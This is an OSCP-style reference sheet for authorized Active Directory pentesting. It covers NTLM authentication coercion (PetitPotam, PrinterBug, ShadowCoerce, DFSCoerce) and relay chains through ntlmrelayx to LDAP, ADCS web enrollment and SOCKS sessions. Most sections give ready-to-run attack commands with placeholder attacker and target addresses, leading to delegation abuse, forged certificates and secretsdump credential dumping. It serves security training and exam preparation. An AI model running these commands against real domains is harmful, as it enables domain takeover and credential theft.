# NTLM/AD Coercion & Relay Techniques — OSCP-style Reference (Authorized AD Pentesting)

*Coercion primitives (PetitPotam / PrinterBug / ShadowCoerce / DFSCoerce) and the full
relay-to-LDAP/ADCS chain, which the OSCP AD set frequently tests. **Coercion is exam-legal** — forcing
a host to authenticate to you is not spoofing; **name-resolution poisoning (Responder/mitm6) is banned**,
so use a plain listener, not Responder's poisoning mode (the distinction is noted at each listener below).*

---

## PetitPotam (MS-EFSRPC)

**What/why:** Abuses the MS-EFSRPC (Encrypting File System Remote Protocol) `EfsRpcOpenFileRaw` call (and several sibling EFSRPC/LSARPC functions) exposed over the `\PIPE\lsarpc` or `\PIPE\efsrpc` named pipe. By supplying an attacker-controlled UNC path, the target machine is coerced into initiating an outbound SMB authentication attempt to the attacker's listener — captured or relayed as NTLM. Most commonly used to coerce a Domain Controller's machine account and relay its authentication elsewhere (classic DC → LDAP relay for RBCD, or DC → ADCS for ESC8).

**Prerequisites:**
- Network reachability to the target's SMB/RPC endpoint (TCP 445).
- EFSRPC/LSARPC pipe accessible (present by default on Windows; the underlying bug is officially "won't fix" by Microsoft although later Windows updates, e.g. KB5005413/CVE‑2021‑36942, restricted the fully unauthenticated path).
- On patched, current builds an **authenticated low-privilege domain session** is generally required to call the RPC (older/unpatched hosts allowed fully anonymous coercion).
- A listener ready to capture/relay the coerced auth (`ntlmrelayx.py`, `Responder`, etc.).

**Command example:**
```bash
# Coerce TARGET_IP to authenticate to ATTACKER_IP (listener)
python3 PetitPotam.py -d DOMAIN -u lowpriv -p 'Password123!' ATTACKER_IP TARGET_IP
```

**Reference:** [github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam) · [thehacker.recipes — MS-EFSR abuse](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr)

### PetitPotam for Hash Capture (standalone, no relay)
When relay is not viable (SMB signing enforced everywhere), use coercion to capture Net-NTLMv2 hashes for offline cracking:
```bash
# Terminal 1: start a listener to catch the coerced authentication.
# NOTE: Responder's default mode also POISONS LLMNR/NBT-NS, which is spoofing and banned on the
# OSCP exam (see EXAM-TIPS.md "Avoid this"). You don't need poisoning here -- coercion tells the
# target exactly where to authenticate -- so use a plain listener on the exam:
sudo impacket-ntlmrelayx -t smb://<UNUSED_TARGET> -smb2support     # or just capture:
sudo impacket-smbserver share . -smb2support

# In labs/engagements where poisoning is in scope, Responder is the usual listener:
# responder -I eth0

# Terminal 2: coerce the target to authenticate
python3 PetitPotam.py <ATTACKER_IP> <TARGET_IP>
```

> **Coercion vs. spoofing:** forcing a host to authenticate to you (PetitPotam, PrinterBug, DFSCoerce)
> is *not* spoofing — you are asking the target directly and it is generally fine. Answering a
> name-resolution broadcast on another host's behalf (Responder/mitm6 poisoning) *is*. Keep the
> distinction straight; the first is exam-safe, the second is not.
Responder captures the Net-NTLMv2 hash. Crack with `hashcat -m 5600`. Machine account hashes ($MACHINE@DOMAIN) are typically random and uncrackable, but user-context coercion (e.g., a service running as a domain user) yields crackable hashes.

---

## PrinterBug (MS-RPRN)

**What/why:** Abuses `RpcRemoteFindFirstPrinterChangeNotificationEx` in the Print System Remote Protocol (MS-RPRN), exposed via `\PIPE\spoolss`. The attacker supplies a fake client name (UNC path) in the notification-registration call; the target's Print Spooler service then connects back and authenticates to that path. This was the original coercion primitive (predates PetitPotam) and is the technique underlying the classic "unconstrained delegation" DC coercion attack.

**Prerequisites:**
- Print Spooler service running and remotely reachable on the target (enabled by default on many Windows Server builds, including many DCs, unless explicitly disabled/hardened per the PrintNightmare mitigations).
- Authenticated (even low-privilege) domain credentials to invoke the RPC call over SMB.
- A listener/relay host.

**Command example:**
```bash
# krbrelayx's printerbug.py (dirkjanm)
python3 printerbug.py DOMAIN/lowpriv:'Password123!'@TARGET_IP ATTACKER_IP

# or the original C# tool
SpoolSample.exe TARGET_IP ATTACKER_IP
```

**Reference:** [github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx) (`printerbug.py`) · [github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample) · [thehacker.recipes — MS-RPRN abuse](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn)

---

## ShadowCoerce (MS-FSRVP)

**What/why:** Abuses the File Server Remote VSS (Volume Shadow Copy Service) Protocol (MS-FSRVP), exposed via `\PIPE\FssagentRpc`, to force a target running the **File Server VSS Agent Service** to authenticate back to the attacker when asked to create/enumerate a shadow copy set.

**Prerequisites:**
- Target must have the **"File Server VSS Agent Service"** role/feature installed and running — this is *not* enabled by default (narrower applicability than PetitPotam/PrinterBug).
- Authenticated domain access to reach the named pipe.
- Note: Microsoft's June 2022 fix for CVE-2022-30154 (KB5014692) mitigates the original PoC in some configurations.

**Command example:**
```bash
python3 shadowcoerce.py -d DOMAIN -u lowpriv -p 'Password123!' ATTACKER_IP TARGET_IP
```

**Reference:** [github.com/ShutdownRepo/ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce) · [thehacker.recipes — MS-FSRVP abuse (ShadowCoerce)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-fsrvp)

---

## DFSCoerce (MS-DFSNM)

**What/why:** Abuses the Distributed File System Namespace Management Protocol (MS-DFSNM) methods `NetrDfsRemoveStdRoot` / `NetrDfsAddStdRoot`, exposed via `\PIPE\netdfs`, to coerce a **Domain Controller** into authenticating to an attacker-controlled host.

**Prerequisites:**
- This method is specifically effective **against Domain Controllers** (DFSNM is DC-hosted).
- Authenticated (low-privilege) domain credentials to call the RPC.
- A listener/relay endpoint.

**Command example:**
```bash
python3 dfscoerce.py -d DOMAIN -u lowpriv -p 'Password123!' ATTACKER_IP TARGET_DC_IP
```

**Reference:** [github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) · [thehacker.recipes — MS-DFSNM abuse (DFSCoerce)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-dfsnm)

**Note — unified framework:** [p0dalirius/Coercer](https://github.com/p0dalirius/Coercer) automates ~12 coercion methods (including PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce variants) behind one CLI: `python3 Coercer.py coerce -u lowpriv -p 'Password123!' -d DOMAIN -l ATTACKER_IP -t TARGET_IP`.

**Faster (nxc):** `nxc smb <target> -u lowpriv -p Password123! -d DOMAIN -M coerce_plus -o LISTENER=<attacker_ip>` checks all major coercion methods (PetitPotam/DFSCoerce/PrinterBug/ShadowCoerce/MSEven) against a target in one command.

---

### Coercer — Unified Coercion Scanner
[Coercer](https://github.com/p0dalirius/Coercer) wraps 12+ coercion methods (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, and more) into a single tool, testing which ones work against a target in one pass.
```bash
# Scan mode — check what's coercible without triggering (safe for enumeration)
coercer scan -t <TARGET_IP> -u user -p pass -d domain.local

# Coerce mode — trigger authentication to your listener
coercer coerce -t <TARGET_IP> -l <ATTACKER_IP> -u user -p pass -d domain.local
```

---

## NTLM Relay Chains via impacket `ntlmrelayx`

**What/why:** `ntlmrelayx.py` (part of [fortra/impacket](https://github.com/fortra/impacket)) listens for incoming NTLM authentication (on the exam, from a **coercion primitive above** — the exam-safe source; in labs also from LLMNR/NBT-NS/mDNS poisoning via `Responder` or IPv6 DNS takeover via `mitm6`, both of which are **exam-banned spoofing**) and **relays** it — without cracking the hash — to a *different* target/protocol that does not enforce SMB/LDAP signing or channel binding, performing an action as the victim identity. This is the step that turns a coercion primitive into privilege escalation.

**Prerequisites (general):** target service does not enforce signing (SMB signing off) or, for LDAP/LDAPS, does not enforce LDAP signing / channel binding (CBT); the relay session must be single-use per authentication (SMB `refreshttl`, `-socks` for reuse); the coerced/poisoned identity must have meaningful privileges on the relay target (a DC machine account is the prime target since it has broad AD write rights and often domain-admin-equivalent enrollment rights on ADCS).

### Target discovery — finding relay-eligible hosts (signing disabled)

**What/why:** Before picking a relay target, enumerate which hosts on the subnet have SMB signing disabled (relayable) and which DC(s) allow LDAP without signing/channel binding. This is also how the `TARGETS.txt` file used in section (d) below is built.

```bash
# SMB signing status across a subnet — writes only signing-disabled hosts to a targets file
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Equivalent with nmap
nmap --script smb2-security-mode -p445 10.10.10.0/24

# LDAP signing/channel-binding status on DCs (relay-to-LDAP eligibility)
nxc ldap 10.10.10.0/24 -u lowpriv -p 'Password123!' -d DOMAIN -M ldap-checker
```
`relay_targets.txt` (or the nmap-derived host list) is then passed to `ntlmrelayx.py -tf TARGETS.txt` / `-t` as shown in section (d).

### a) Relay to LDAP for RBCD (Resource-Based Constrained Delegation)

**What/why:** Relay a coerced machine account's NTLM auth to LDAP on a Domain Controller and have `ntlmrelayx` write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer object, granting an attacker-controlled computer account delegation rights. The attacker then performs S4U2Self + S4U2Proxy to impersonate any user (e.g., a Domain Admin) to the target machine, obtaining a valid service ticket = local admin on that host.

**Prerequisites:** LDAP signing not enforced on the DC; an attacker-controlled computer account to receive the delegation grant (createable via default `ms-DS-MachineAccountQuota` with `impacket-addcomputer`); a coercible machine with enough rights to modify the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` (commonly achieved by coercing the target machine itself, or a DC, and relaying to LDAP on another DC).

```bash
# 1. Create an attacker-controlled machine account (uses default MachineAccountQuota)
impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'Passw0rd!' \
    -dc-host dc01.corp.local 'CORP.LOCAL/lowpriv:Password123!'

# 2. Start ntlmrelayx targeting LDAP, granting delegation to EVILPC$
ntlmrelayx.py -t ldap://dc01.corp.local --delegate-access -smb2support

# 3. Coerce TARGET machine to authenticate to attacker (e.g. PetitPotam/PrinterBug)
python3 PetitPotam.py ATTACKER_IP TARGET_IP

# 4. Once RBCD is granted, request a service ticket as Administrator via S4U
impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
    -dc-ip 10.0.0.1 'CORP.LOCAL/EVILPC$:Passw0rd!'

# 5. Use the ticket
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass TARGET.corp.local
```

**Reference:** [github.com/fortra/impacket](https://github.com/fortra/impacket) · [Elad Shamir — Wagging the Dog: Abusing RBCD](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html) · [thehacker.recipes — NTLM relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)

### b) Relay to LDAP(S) for Shadow Credentials

**What/why:** Alternative to RBCD when the operator wants direct authentication as the target rather than a delegation primitive — `ntlmrelayx` writes an attacker key to the target's `msDS-KeyCredentialLink` (the "Whisker" technique), enabling PKINIT authentication as that account.

```bash
ntlmrelayx.py -t ldaps://dc01.corp.local --shadow-credentials --shadow-target 'TARGETPC$' -smb2support
```

**Reference:** [github.com/fortra/impacket](https://github.com/fortra/impacket) · [Shadow Credentials blog (research on msDS-KeyCredentialLink abuse)](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

### c) Relay to ADCS Web Enrollment — ESC8

**What/why:** Relay coerced NTLM authentication to an AD Certificate Services **HTTP** web-enrollment endpoint (`/certsrv/certfnsh.asp`) to request a client-authentication certificate *as the victim*. If the victim is a Domain Controller machine account, the resulting certificate enables PKINIT/Schannel authentication as that DC — equivalent to DCSync/Domain Admin.

**Prerequisites:** an Enterprise CA with the Web Enrollment role installed and reachable over plain HTTP (or HTTPS without Extended Protection for Authentication / channel binding enforced); the relayed identity has Enroll rights on a certificate template usable for client/computer authentication (e.g., default `Machine`/`DomainController` templates satisfy this for machine accounts).

```bash
# Start ntlmrelayx targeting the CA's web enrollment endpoint
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce a DC (or other target) to authenticate to the attacker's listener
python3 PetitPotam.py ATTACKER_IP DC01_IP
# (or krbrelayx printerbug.py, dfscoerce.py, shadowcoerce.py — any coercion primitive above)

# ntlmrelayx dumps a base64 .pfx / cert to disk on success; use it to get a TGT
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
# or
gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass '' CORP.LOCAL/DC01\$ dc01.ccache
```

**Reference:** [github.com/fortra/impacket](https://github.com/fortra/impacket) · [SpecterOps — Certified Pre-Owned whitepaper (ESC1–ESC8)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) · [BloodHound edge doc — CoerceAndRelayNTLMToADCS](https://bloodhound.specterops.io/resources/edges/coerce-and-relay-ntlm-to-adcs) · [hackingarticles.in — ADCS ESC8 walkthrough](https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/)

### d) Interactive/SOCKS relay mode

**What/why:** Instead of a single scripted action, `ntlmrelayx -socks` keeps relayed sessions alive as SOCKS proxies so an operator can interactively drive tools (`secretsdump.py`, `smbclient.py`, `impacket-mssqlclient`, etc.) through the relayed authentication.

```bash
ntlmrelayx.py -socks -smb2support -tf TARGETS.txt
# then, in a second terminal, once a session appears:
proxychains impacket-secretsdump -no-pass 'CORP.LOCAL/TARGETPC$'@TARGET_IP
```

**Reference:** [github.com/fortra/impacket](https://github.com/fortra/impacket)
